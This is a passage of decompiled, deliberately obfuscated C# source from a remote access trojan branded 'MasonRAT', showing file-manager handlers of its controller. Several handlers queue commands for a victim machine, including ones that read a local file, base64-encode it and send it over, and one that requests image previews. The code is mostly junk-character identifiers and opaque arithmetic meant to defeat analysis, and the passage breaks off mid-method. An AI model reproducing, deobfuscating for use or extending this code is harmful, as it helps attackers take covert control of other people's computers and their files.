      strArray[(1376367342 + (667745571 | 1873661729) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) - ~(626413385 + 414318249 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
      this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
    }
    if (Operators.CompareString(this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 315), false) != 0)
      return;
    string[] strArray1 = new string[(1457995922 + (828712820 << 1211319808) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + (-721676195 - ~1385561929 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 | (1924371564 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0];
    strArray1[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 316);
    strArray1[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray1[(-1384243947 - 750245778 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) - ~(-1046630116 - 1113847454 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ;
    strArray1[(127023289 + 1904472542 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 > (1721055467 ^ 1486857289 << 265162277) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 ? (981434350 ^ (309493600 | 980373197)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 : (17 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray1[(17 ^ 18) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 + (1440407218 - (1088466386 >> 1283285375) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 >> ((730320862 | 356973601) - 496876321 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
    Outcoming_Requests outcomingRequests1 = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray1)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests1);
    this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
    this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
  }

  private void \u2694️MasonRAT\u270Cـټــڙحڙ\u060Eءـگۚـټ(object sender, EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
    this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        // ISSUE: variable of a reference type
        string& local;
        // ISSUE: explicit reference operation
        string str = ^(local = ref this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 317) + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text;
        local = str;
        this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 318);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608\u060D\u060Bـڙٽ̍ـــڞح\u060Dڠڙ\u060Ą(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cﯧ\u060Dڙٻڠـ\u0608\u060B\u0609حڝ(object sender, EventArgs e)
  {
    string str = (string) null;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
        str = str + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 319) + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text;
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    try
    {
      string[] strArray = new string[((-817999280 ^ -1519335316) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + -(775141512 + 1008394671 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 320);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(526310319 + 1048729062 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 > 1679650164 - 930656467 % 310332345 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ? 496417011 - 496417009 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 : (21 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 321)));
      strArray[931678408 - (1467126682 | 1617186893) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + (-1702692234 - 1519677276 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((-1863391395 ^ 1686598914 << 1196025701) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ ~1903397174 - 2093363760 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 >> (643772345 - 481359851 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = str;
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۙۡٸـ\u060Aۭۡـۙ\u0608ڙـؤ\u060A̍\u060B\u060B(
    object sender,
    EventArgs e)
  {
    string str = (string) null;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
        str = str + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 322) + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text;
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    try
    {
      string[] strArray = new string[(-444949581 ^ ~178125606) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 + -(2051676262 - 1781627137 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 323);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1894983457 + 997087203 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 ^ ~(1184605200 + 754222707 % 535931274 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 324)));
      strArray[545990207 + (1228637412 << 222475316) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 - (1603625465 + 255181891 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((1156474600 << 1931060103) - 1110185569 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 > (198233444 > 2136053572 ? 773639689 : 580229767) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ? (68 ^ 270992588 >> 230826134) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 : 1519708336 + -1519708331 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)] = str;
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـڅ\u060Dڦ\u060Bڙى\u0609\u060Dــ\u060Fـڟڙــ\u060D(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Image = (Image) null;
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Visible = false;
    if (this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems.Count != 1)
      return;
    ListViewItem selectedItem = this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems[0];
    try
    {
      if (selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 325)) | selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 326)) | selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 327)) | selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 328)) | selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 329)) | selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 330)) | selectedItem.Text.ToLower().EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 331)))
      {
        string[] strArray = new string[((848093562 > 913370185 ? -402146793 : -301610095) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ^ ~((301610097 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 332);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
